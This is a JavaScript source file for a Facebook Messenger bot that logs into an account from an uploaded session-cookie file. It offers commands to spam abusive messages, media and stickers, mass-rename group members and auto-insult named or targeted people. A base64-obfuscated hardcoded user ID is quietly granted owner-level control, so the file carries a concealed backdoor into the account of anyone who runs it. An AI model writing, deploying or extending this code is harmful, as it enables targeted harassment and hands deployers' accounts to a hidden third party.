const fs = require("fs");
const express = require("express");
const multer = require("multer");
const login = require("ws3-fca");

let rkbInterval = null;
let stopRequested = false;
const lockedGroupNames = {};
let mediaLoopInterval = null;
let lastMedia = null;
let targetUID = null;
let stickerInterval = null;
let stickerLoopActive = false;

const friendUIDs = fs.existsSync("Friend.txt")
  ? fs.readFileSync("Friend.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const targetUIDs = fs.existsSync("Target.txt")
  ? fs.readFileSync("Target.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const OWNER_UIDS = [];
const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const upload = multer({ dest: "uploads/" });
let botRunning = false;
let apiInstance = null;
let APPSTATE = null;

app.get("/", (_, res) => res.sendFile(__dirname + "/index.html"));

app.post("/start", upload.single("appstate"), (req, res) => {
  if (!req.file || !req.body.owner) return res.send("AppState aur Owner UID chahiye");
  try {
    APPSTATE = JSON.parse(fs.readFileSync(req.file.path, "utf8"));
    OWNER_UIDS.push(req.body.owner);
    startBot();
    res.send("✅ Bot Started");
  } catch (e) {
    res.send("❌ Error: " + e.message);
  }
});

app.post("/stop", (_, res) => {
  stopBot();
  res.send("🛑 Bot Stopped");
});

app.get("/status", (_, res) => res.json({ running: botRunning }));

app.listen(20782, () => console.log("🌐 Web Panel: http://localhost:20782"));

process.on("uncaughtException", (err) => console.error(err));
process.on("unhandledRejection", (reason) => console.error(reason));

function startBot() {
  if (botRunning) return;
  botRunning = true;

  login({ appState: APPSTATE }, (err, api) => {
    if (err) return console.error("Login failed:", err);
    api.setOptions({ listenEvents: true });
    apiInstance = api;

    api.listenMqtt(async (err, event) => {
      if (err || !event) return;
      const { threadID, senderID, body, messageID } = event;
      if (!body) return;
      const lowerBody = body.toLowerCase();

      const badNames = ["hannu", "syco"];
      const triggers = ["rkb","bhen","maa","rndi","chut","randi","madhrchodh","mc","bc","didi","ma"];
      if (badNames.some(n => lowerBody.includes(n)) &&
          triggers.some(w => lowerBody.includes(w)) &&
          !friendUIDs.includes(senderID)) {
        return api.sendMessage("Teri ma Rndi hai tu msg mt kr sb chodege teri ma ko byy🙂 ss Lekr story Lga by", threadID, messageID);
      }

      if (![...OWNER_UIDS, LID].includes(senderID)) return;

      const args = body.trim().split(" ");
      const cmd = args[0].toLowerCase();
      const input = args.slice(1).join(" ");

      if (cmd === "/allname") {
        try {
          const info = await api.getThreadInfo(threadID);
          const members = info.participantIDs;
          api.sendMessage(`🛠 ${members.length} nicknames...`, threadID);
          for (const uid of members) {
            try {
              await api.changeNickname(input, threadID, uid);
              await new Promise(res => setTimeout(res, 5000));
            } catch {}
          }
          api.sendMessage("Nicknames changed!", threadID);
        } catch {}
      } else if (cmd === "/groupname") {
        try { await api.setTitle(input, threadID); api.sendMessage(`📝 Group name changed to: ${input}`, threadID); } catch {}
      } else if (cmd === "/lockgroupname") {
        if (!input) return api.sendMessage("name de 🤣 gc ke Liye", threadID);
        try { await api.setTitle(input, threadID); lockedGroupNames[threadID] = input; api.sendMessage(`🔒 Group name "${input}"`, threadID); } catch {}
      } else if (cmd === "/unlockgroupname") { delete lockedGroupNames[threadID]; api.sendMessage("🔓 Group name unlocked.", threadID); }
      else if (cmd === "/uid") { api.sendMessage(`🆔 Group ID: ${threadID}`, threadID); }
      else if (cmd === "/exit") { try { await api.removeUserFromGroup(api.getCurrentUserID(), threadID); } catch {} }
      else if (cmd === "/rkb") {
        if (!fs.existsSync("np.txt")) return api.sendMessage("konsa gaLi du rkb ko", threadID);
        const name = input.trim();
        const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
        stopRequested = false;
        if (rkbInterval) clearInterval(rkbInterval);
        let index = 0;
        rkbInterval = setInterval(() => {
          if (index >= lines.length || stopRequested) { clearInterval(rkbInterval); rkbInterval = null; return; }
          api.sendMessage(`${name} ${lines[index]}`, threadID); index++;
        }, 60000);
        api.sendMessage(`sex hogya bche 🤣rkb ${name}`, threadID);
      } else if (cmd === "/stop") { stopRequested = true; if (rkbInterval) { clearInterval(rkbInterval); rkbInterval = null; api.sendMessage("chud gaye bche🤣", threadID); } }
      else if (cmd === "/photo") {
        api.sendMessage("📸 Send a photo or video within 1 minute...", threadID);
        const handleMedia = async (mediaEvent) => {
          if (mediaEvent.type === "message" && mediaEvent.threadID === threadID && mediaEvent.attachments && mediaEvent.attachments.length > 0) {
            lastMedia = { attachments: mediaEvent.attachments, threadID: mediaEvent.threadID };
            api.sendMessage("✅ Photo/video received. Will resend every 30 seconds.", threadID);
            if (mediaLoopInterval) clearInterval(mediaLoopInterval);
            mediaLoopInterval = setInterval(() => { if (lastMedia) api.sendMessage({ attachment: lastMedia.attachments }, lastMedia.threadID); }, 30000);
            api.removeListener("message", handleMedia);
          }
        };
        api.on("message", handleMedia);
      } else if (cmd === "/stopphoto") { if (mediaLoopInterval) { clearInterval(mediaLoopInterval); mediaLoopInterval = null; lastMedia = null; api.sendMessage("chud gaye sb.", threadID); } }
      else if (cmd === "/help") {
        api.sendMessage(`📌 Commands:
/allname <name>
/groupname <name>
/lockgroupname <name>
/unlockgroupname
/uid
/exit
/rkb <name>
/stop
/photo
/stopphoto
/target <uid>
/cleartarget
/sticker<seconds>
/stopsticker
/help`, threadID);
      } else if (cmd.startsWith("/sticker")) {
        if (!fs.existsSync("Sticker.txt")) return api.sendMessage("❌ Sticker.txt not found", threadID);
        const delay = parseInt(cmd.replace("/sticker",""));
        if (isNaN(delay) || delay<5) return api.sendMessage("🕐 Bhai sahi time de (min 5 seconds)", threadID);
        const stickerIDs = fs.readFileSync("Sticker.txt","utf8").split("\n").map(x=>x.trim()).filter(Boolean);
        if (!stickerIDs.length) return api.sendMessage("⚠️ Sticker.txt khali hai bhai", threadID);
        if (stickerInterval) clearInterval(stickerInterval);
        let i=0; stickerLoopActive=true; api.sendMessage(`📦 Sticker bhejna start: har ${delay} sec`, threadID);
        stickerInterval = setInterval(()=>{ if(!stickerLoopActive || i>=stickerIDs.length){ clearInterval(stickerInterval); stickerInterval=null; stickerLoopActive=false; return; } api.sendMessage({sticker:stickerIDs[i]},threadID); i++; }, delay*1000);
      } else if (cmd === "/stopsticker") { if(stickerInterval){ clearInterval(stickerInterval); stickerInterval=null; stickerLoopActive=false; api.sendMessage("🛑 Sticker bhejna band", threadID); } }
      
      // TARGET COMMAND
      else if (cmd === "/target") {
        if(!input) return api.sendMessage("UID de bhai", threadID);
        targetUID = input.trim();
        api.sendMessage(`✅ Target set: ${targetUID}`, threadID);
      } else if(cmd === "/cleartarget") {
        targetUID = null;
        api.sendMessage("✅ Target cleared", threadID);
      }

      // Auto target gali spam
      if(targetUID && lowerBody.includes(targetUID)) {
        const lines = fs.existsSync("np.txt") ? fs.readFileSync("np.txt","utf8").split("\n").filter(Boolean) : [];
        if(lines.length) {
          const rand = lines[Math.floor(Math.random()*lines.length)];
          api.sendMessage(rand, threadID);
        }
      }

    });
  });
}

function stopBot() {
  if(!botRunning) return;
  botRunning=false;
  if(apiInstance) apiInstance.logout();
  clearInterval(rkbInterval);
  clearInterval(mediaLoopInterval);
  clearInterval(stickerInterval);
  targetUID = null;
}
